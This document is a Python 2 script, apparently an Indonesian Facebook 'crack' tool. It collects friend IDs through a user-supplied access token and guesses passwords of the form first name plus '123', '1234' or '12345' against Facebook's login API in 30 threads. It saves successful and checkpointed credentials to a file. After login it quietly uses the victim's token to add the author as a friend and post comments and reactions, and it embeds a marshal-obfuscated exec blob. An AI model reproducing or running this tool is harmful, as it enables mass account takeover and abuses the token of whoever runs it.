#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool



try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 anme.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "[!] Exit"
	os.sys.exit()

        

	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
import marshal
exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x00s\n\x00\x00\x00d\x00\x00Z\x00\x00d\x01\x00S(\x02\x00\x00\x00sX\x05\x00\x00\n\x1b[1;91m \xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;97m \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\x1b[1;91m \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x9d\n\x1b[1;97m \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\n\x1b[1;91m \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\n\x1b[1;97m \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\n\n\x1b[1;91m\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;97m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\n\x1b[1;97m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\n\x1b[1;91m\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\x1b[1;97m\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n\n\x1b[1;30;42m SELAMAT DATANG & SELAMAT MENGGUNAKAN ;) \x1b[0m N(\x01\x00\x00\x00t\x04\x00\x00\x00logo(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x10\x00\x00\x00<Ahmad_Riswanto>t\x08\x00\x00\x00<module>\x12\x00\x00\x00t\x00\x00\x00\x00'))

    




def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;93m●\033[1;97m]\033[1;93m Sedang Masuk\033[1;97m "+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
cpe = []
id = []
username = []
idteman = []
idfromteman = []

######MASUK######
def masuk():
	os.system('clear')
	print logo
	print "\033[1;97m  [\033[1;97m01\033[1;97m]\033[1;96m\033[1;97m Login Menggunakan Token Facebook"
	print "\033[1;97m  [\033[1;91m00\033[1;97m]\033[1;96m\033[1;97m Keluar"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m \033[1;97mToken FB: \033[1;93m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan ('\033[1;97m SELAMAT DATANG GUNAKAN DENGAN BIJAK SAYANG')
		jalan ('\033[1;97m[\033[1;91m•\033[1;97m•\033[1;97m]\033[1;92m Login Berhasil')
		os.system('xdg-open https://m.facebook.com/rony.ska.7')
		bot_komen()
	except KeyError:
		print "\033[1;97m[\033[1;93m!\033[1;97m] \033[1;93mToken Salah !"
		time.sleep(1.0)
		masuk()
	
	
###### BOT KOMEN #######
def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;39m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100055084094176'
    una2 = '100013208807358'
    kom = '√Hadir \xf0\x9f\x98\x81\xf0\x9f\x98\x81'
    reac = 'LOVE'
    post = '173947114451424'
    post2 = '159860782526724'
    kom2 = 'Hadir ziz cakep bner kamu sih❤\xf0\x9f\x99\x8f'
    reac2 = 'ANGRY'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
    menu()


######MENU#######
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=' +toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print "\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
	print "\033[1;92m Nama Akun \033[1;97m ∆ \033[1;92m "+nama
	print "\033[1;92m User ID\033[1;97m ∆ \033[1;92m "+id
	print "\033[1;92m Tanggal Lahir\033[1;97m ∆ \033[1;92m "+ a['birthday']
	print "\n\033[1;97m──────────────────────────────────────────────────"
	print "\033[1;91m{01}\033[1;97m × Mulai Crack"
	print "\n\033[1;97m──────────────────────────────────────────────────"
	print "\033[1;91m{02}\033[1;97m × Ambil ID"
	print "\n\033[1;97m──────────────────────────────────────────────────"
	print "\033[1;91m{03}\033[1;97m × Add Facebook Saya"
	print "\n\033[1;97m──────────────────────────────────────────────────"
	print "\033[1;97m{00}\033[1;91m × Logout"
	print "\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if unikers =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		indo()
	elif unikers =="2" or unikers =="02":
		dump()
	elif unikers =="3" or unikers =="03":
		saya()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus Token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih()
	
########## CRACK INDONESIA #######
def indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken Invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print "\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
	print "\n\033[1;97m──────────────────────────────────────────────────"
	print "\033[1;91m{01}\033[1;97m• Crack Id Teman"
	print "\n\033[1;97m──────────────────────────────────────────────────"
	print "\033[1;91m{02}\033[1;97m• Crack dari File"
	print "\n\033[1;97m──────────────────────────────────────────────────"
	print "\033[1;91m{00}\033[1;97m• Kembali"
	print "\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
	pilih_indo()

#### PILIH INDO ####
def pilih_indo():
	teak = raw_input("\033[1;97m [\033[1;91mPilih\033[1;97m1 , 2 , 00 !\033[1;97m]\033[1;97m ")
	if teak =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print "\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
		idt = raw_input("\033[1;37m [\033[1;37m🍎\033[1;37m🍎\033[1;37m] User ID Target :")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;37m [\033[1;37m🍎\033[1;37m🍎\033[1;37m] Nama Akun:  "+op["name"]
		except KeyError:
			print"\033[1;97m[\033[1;93m!\033[1;97m] ID Publik / Teman Tidak Ada !"
			raw_input("\n[ Kembali ]")
			indo()
		except requests.exceptions.ConnectionError:
			print"[!] Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		try:
			print "\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
			idlist = raw_input('\033[1;97m [\033[1;91m🍏\033[1;97m🍏\033[1;97m] Nama File Target : ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m[\033[1;93m!\033[1;97m] File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m[!] File tidak ada !'
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
			indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;37m [\033[1;37m🍎\033[1;37m🍎\033[1;37m] Total ID :"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;37m [\033[1;37m🍎\033[1;37m🍎\033[1;37m] Crack Berjalan  "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
	print "\033[1;97m \033[1;41;97m UNTUK BERHENTI TEKAN CTRL+Z MOGA BERUNTUNG \033[0m"
	print "\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
	print "\n\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
	print "   \033[1;31;47m ON OFF MODE PESAWAT JIKA TIDAK ASA HASIL \033[0m"
	print "\n\033[1;97m ⸙╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺╺ ⸙"
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write('\r{}'.format(datetime.now().strftime('\033[1;37m%H:%M:%S')));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m[\x1b[1;92m⸙\x1b[1;97m] \033[1;37;42mBERHASIL \033[0m")
				print ("\x1b[1;97m[\x1b[1;92m※\x1b[1;97m] Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m[\x1b[1;92m⬢\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m[\x1b[1;92m✓\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m") + bos1
				print "\n\033[1;94m──────────────────────────────────────────────────"
				oke = open("done/indo.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m[\x1b[1;93m⸙\x1b[1;97m] \033[1;30;43mCEKPOINT \033[0m")
					print ("\x1b[1;97m[\x1b[1;93m※\x1b[1;97m] Nama  \x1b[1;91m    • \033[1;37m") + j['name']
					print ("\x1b[1;97m[\x1b[1;93m⬢\x1b[1;97m] User  \x1b[1;91m    • \033[1;37m") + zowe
					print ("\x1b[1;97m[\x1b[1;93m✓\x1b[1;97m] Password  \x1b[1;91m• \033[1;37m") + bos1
					print "\n\033[1;94m──────────────────────────────────────────────────"
					cek = open("done/indo.txt", "a")
					cek.write("\n{×} CEKPOINT {×} Nama     > " +j['\033[1;37;44mname \033[0m']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m[\x1b[1;92m⸙\x1b[1;97m] \033[1;37;42mBERHASIL \033[0m")
						print ("\x1b[1;97m[\x1b[1;92m※\x1b[1;97m] Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m[\x1b[1;92m⬢\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m[\x1b[1;92m✓\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m") + bos2
						print "\n\033[1;94m──────────────────────────────────────────────────"
						oke = open("done/indo.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m[\x1b[1;93m⸙\x1b[1;97m] \033[1;30;43mCEKPOINT \033[0m")
							print ("\x1b[1;97m[\x1b[1;93m※\x1b[1;97m] Nama  \x1b[1;91m    • \033[1;37m") + j['name']
							print ("\x1b[1;97m[\x1b[1;93m⬢\x1b[1;97m] User  \x1b[1;91m    • \033[1;37m") + zowe
							print ("\x1b[1;97m[\x1b[1;93m✓\x1b[1;97m] Password  \x1b[1;91m• \033[1;37m") + bos2
							print "\n\033[1;94m──────────────────────────────────────────────────"
							cek = open("done/indo.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
					         bos2 = j['first_name'].lower()+'12345'
					         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					         ko = json.load(data)
					         if 'access_token' in ko:
						         print ("\n\x1b[1;97m[\x1b[1;92m⸙\x1b[1;97m] \033[1;37;42mBERHASIL \033[0m")
						         print ("\x1b[1;97m[\x1b[1;92m※\x1b[1;97m] Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						         print ("\x1b[1;97m[\x1b[1;92m⬢\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m") + zowe
						         print ("\x1b[1;97m[\x1b[1;92m✓\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m") + bos2
						         print "\n\033[1;94m──────────────────────────────────────────────────"
						         oke = open("done/indo.txt", "a")
						         oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						         oke.close()
						         oks.append(zowe)
					         else:
						           if 'www.facebook.com' in ko['error_msg']:
							           print ("\n\x1b[1;97m{\x1b[1;93m⸙\x1b[1;97m} \033[1;30;43mCEKPOINT \033[0m")
							           print ("\x1b[1;97m[\x1b[1;93m※\x1b[1;97m] Nama  \x1b[1;91m    • \033[1;37m") + j['name']
							           print ("\x1b[1;97m[\x1b[1;93m⬢\x1b[1;97m] User  \x1b[1;91m    • \033[1;37m") + zowe
							           print ("\x1b[1;97m[\x1b[1;93m✓\x1b[1;97m] Password  \x1b[1;91m• \033[1;37m") + bos2
							           print "\n\033[1;94m──────────────────────────────────────────────────"
							           cek = open("done/indo.txt", "a")
							           cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							           cek.close()
							           cekpoint.append(zowe)
						 
						
						#
												
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mSelesai ...'
	print"\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;93mfile tersimpan \033[1;91m: \033[1;92mdone/indo.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;93mKembali\033[1;97m>}")
	os.system("python2 anme.py")
	

					
		
	
######### DUMP ##########
def dump():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		menu()
	os.system('clear')
	print logo
	print "\033[1;97m ══════════════════════════════════════════"
	print "\033[1;97m [\033[1;97m01\033[1;97m]\033[1;93m\033[1;97m Ambil ID dari Daftar Teman "
	print "\033[1;97m [\033[1;97m02\033[1;97m]\033[1;93m\033[1;97m Ambil ID dari Publik / Teman "
	print "\033[1;97m [\033[1;91m00\033[1;97m]\033[1;93m\033[1;97m Kembali "
	print "\033[1;97m ══════════════════════════════════════════"
	dump_pilih()
	
	
def dump_pilih():
	cuih = raw_input("\033[1;97m [\033[1;91m•\033[1;97m•\033[1;97m]\033[1;97m ")
	if cuih =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		dump_pilih()
	elif cuih =="1" or cuih =="01":
		id_teman()
	elif cuih =="2" or cuih =="02":
		idfrom_teman()
	elif cuih =="0" or cuih =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] Isi Yg Benar !"
		dump_pilih()
		
##### ID TEMAN #####
def id_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		print 45* "\033[1;97m="
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mMengambil semua ID Teman \033[1;97m...')
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[\033[1;93m"+str(len(idteman))+"\033[1;97m]\033[1;97m =>"),;sys.stdout.flush();time.sleep(0.0050)
			print '\033[1;97m'+a['id']
		bz.close()
		print '\r\033[1;97m[\033[1;93m✓\033[1;97m] \033[1;97mSukses Mengambil ID \033[1;97m....'
		print"\r\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mTotal ID : %s"%(len(idteman))
		done = raw_input("\r\033[1;97m[\033[1;93m?\033[1;97m] \033[1;97mSimpan Nama File : ")
		os.rename('out/id_teman.txt','out/'+done)
